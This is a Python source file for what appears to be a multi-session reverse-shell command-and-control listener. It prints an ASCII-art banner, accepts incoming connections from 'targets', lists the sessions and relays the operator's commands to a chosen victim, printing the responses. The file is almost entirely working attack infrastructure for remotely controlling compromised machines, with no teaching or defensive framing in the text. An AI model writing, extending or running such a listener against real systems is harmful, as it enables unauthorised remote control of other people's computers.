import socket
import sys
import threading


def banner():
    print("            __                                  _                 __       _                                      ____   ")
    print("   _ ___    LJ    ___ _     ____      ____     FJ___      ____    LJ    ___FJ     ____     _ ___        ____     / _  `. ")
    print("  J '__ J   FJ   F __` L   F ___J.   F __ J   J  __ `.   F __ J   FJ   F __  L   F __ J   J '__ \",     F ___J.  J_/-7 .' ")
    print("  | |--| | J  L | |--| |  | |---LJ  | _____J  | |--| |  | |--| | J  L | |--| |  | _____J  | |__|-J    | |---LJ  `-:'.'.' ")
    print("  F L__J J J  L F L__J J  F L___--. F L___--. F L  J J  F L__J J J  L F L__J J  F L___--. F L  `-'    F L___--. .' ;_J__ ")
    print(" J  _____/LJ__LJ\____,__LJ\______/FJ\______/FJ__L  J__LJ\______/FJ__LJ\____,__LJ\______/FJ__L        J\______/FJ________L")
    print(" |_J_____F |__| J____,__F J______F  J______F |__L  J__| J______F |__| J____,__F J______F |__L         J______F |________|")
    print(" L_J                                                                                                                     ")


def comm_in(targ_id):
    print('[+] Awaiting response...')
    response = targ_id.recv(1024).decode()
    return response


def comm_out(targ_id, message):
    message = str(message)
    targ_id.send(message.encode())


def target_comm(targ_id):
    while True:
        message = input('Command -> ')
        comm_out(targ_id, message)
        if message == 'exit':
            targ_id.send(message.encode())
            targ_id.close()
            break
        if message == 'background':
            break
        else:
            response = comm_in(targ_id)
            if response == 'exit':
                print('[-] The client has terminated the session.')
                targ_id.close()
                break
        print(response)


def listener_handler():
    sock.bind((host_ip, int(host_port)))
    print('[+] Awaiting connection from client...')
    sock.listen()

    t1 = threading.Thread(target=comm_handler)
    t1.start()


def comm_handler():
    while True:
        if kill_flag == 1:
            break
        try:
            remote_target, remote_ip = sock.accept()
            targets.append([remote_target, remote_ip[0]])
            print(
                f'\n[+] Connection received from {remote_ip[0]}\n' + 'Enter command -> ', end="")
        except:
            pass


if __name__ == '__main__':
    targets = []
    banner()
    kill_flag = 0
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        host_ip = sys.argv[1]
        host_port = int(sys.argv[2])
        # host_ip = '127.0.0.1'
        # host_port = 2222
    except IndexError:
        print('[-] Command line argument(s) missing. Use -h to display help.')
    except Exception as e:
        print(e)

    listener_handler()

    while True:
        try:
            command = input('Enter command ->')
            if command.split(" ")[0] == 'sessions':
                session_counter = 0
                if command.split(" ")[1] == '-l':
                    print('Session' + ' ' * 10 + 'Target')
                    for target in targets:
                        print(str(session_counter) + ' ' * 16 + target[1])
                        session_counter += 1
                if command.split(" ")[1] == '-i':
                    num = int(command.split(" ")[2])
                    targ_id = (targets[num])[0]
                    target_comm(targ_id)
        except KeyboardInterrupt:
            print('\n[+] Keyboard interrupt sent.')
            kill_flag = 1
            sock.close()
            break
